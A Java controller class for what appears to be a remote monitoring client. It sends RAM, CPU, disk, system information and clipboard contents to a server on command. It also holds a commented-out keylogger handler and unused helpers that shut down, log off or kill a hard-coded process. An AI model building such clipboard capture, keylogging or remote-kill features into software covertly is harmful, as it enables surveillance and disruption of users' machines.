package controllers;

import models.MessageModel;
import models.SystemInfoModel;
import utils.Helper;
import utils.JSON;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Optional;

import static utils.Command.*;
import static utils.Environment.DEFAULT_FROM;
import static utils.Environment.DEFAULT_SERVER_HOST;

public class Controller {
    private static SystemInfoModel si = new SystemInfoModel();

    private static Map<String, Executable<JSON>> controller = new HashMap();

    public static void init() {
        put(COMMAND_RAM, Controller::getMonitoring);
        put(COMMAND_MONITORING, Controller::getMonitoring);
        put(COMMAND_CLIPBOARD, Controller::getClipboard);
        put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
//        put(COMMAND_KEYLOGGER, Controller::getKeylogger);
    }

//    private static String getKeylogger(JSON input) {
//        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_KEYLOGGER)
//                .put("keylogger", new JSONArray(KeyLogger.getKeylog()))
//                .json();
//    }

    private static String getClipboard(JSON input) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIPBOARD)
                .put("clipboard", si.getClipboard())
                .json();
    }

    private static String getMonitoring(JSON input) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_MONITORING)
                .put("ram", si.getMemoryLoadPercentage())
                .put("cpu", si.getProcessorLoadPercentage())
                .put("disk", si.getDriveLoadPercentage())
                .json();
    }

    private static String getClientSystemInfo(JSON admin) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST)
                .put(COMMAND, COMMAND_CLIENT_SYSTEM_INFO)
                .put("result", new JSON(si))
                .json();
    }

    private static String getNotFoundController(JSON input) {
        return new MessageModel("", DEFAULT_SERVER_HOST, "STATUS_MESSAGE_403").json();
    }

    private static void shutdown(JSON input) throws IOException {
        String shutdownCommand;
        String operatingSystem = System.getProperty("os.name");

        if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
            shutdownCommand = "shutdown -h now";
        }
        // This will work on any version of windows including version 11
        else if (operatingSystem.contains("Windows")) {
            shutdownCommand = "shutdown.exe -s -t 0";
        } else {
            throw new RuntimeException("Unsupported operating system.");
        }

        Runtime.getRuntime().exec(shutdownCommand);
        System.exit(0);
    }

    private static void killProcess(JSON input) throws IOException {
        String pid = "4432";
        Runtime.getRuntime().exec("taskkill /F /PID " + pid);
    }

    private static void logoff(JSON input) throws IOException {
        Runtime.getRuntime().exec("shutdown /L");
    }

    private static long getGigabytesByBytes(Long bytes) {
        return (long) (bytes / (1024 * 1024 * 1024));
    }

    public static String getPercentCpuUsage() {
        return Helper.CommandPrompt("wmic cpu get loadPercentage");
    }

    public static Executable get(String key) {
        return controller.getOrDefault(key, Controller::getNotFoundController);
    }

    public static Executable put(String key, Executable<JSON> value) {
        return controller.put(key, value);
    }

    private static String text(Optional<?> optional) {
        return optional.map(Object::toString).orElse("-");
    }
}
